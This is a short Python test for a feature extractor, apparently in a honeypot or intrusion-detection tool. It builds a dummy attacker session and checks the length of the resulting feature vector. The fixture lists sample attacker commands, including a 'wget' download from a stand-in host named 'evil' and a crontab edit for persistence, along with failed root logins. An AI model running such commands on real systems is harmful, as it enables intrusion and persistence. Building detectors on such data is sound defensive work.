from ai.feature_extractor import FEATURES, extract_features


class DummySession:
    def __init__(self):
        self.commands = [
            {"command": "whoami"},
            {"command": "uname -a"},
            {"command": "wget http://evil"},
            {"command": "crontab -e"},
        ]
        self.credentials_tried = [
            {"username": "root", "password": "1", "success": False},
            {"username": "root", "password": "2", "success": False},
            {"username": "root", "password": "3", "success": False},
            {"username": "root", "password": "4", "success": False},
        ]
        from datetime import datetime, timedelta

        self.start_time = datetime.utcnow() - timedelta(minutes=4)
        self.end_time = datetime.utcnow()
        self.malware_hashes = ["deadbeef"]


class DummyProfile:
    ip = "1.2.3.4"
    vpn_detected = True


def test_extract_features_shape():
    vec = extract_features(DummySession(), DummyProfile(), multi_protocol=True, known_bad_ip=True)
    assert len(vec) == len(FEATURES) == 16
    assert vec[2] == 1.0
    assert vec[4] == 1.0
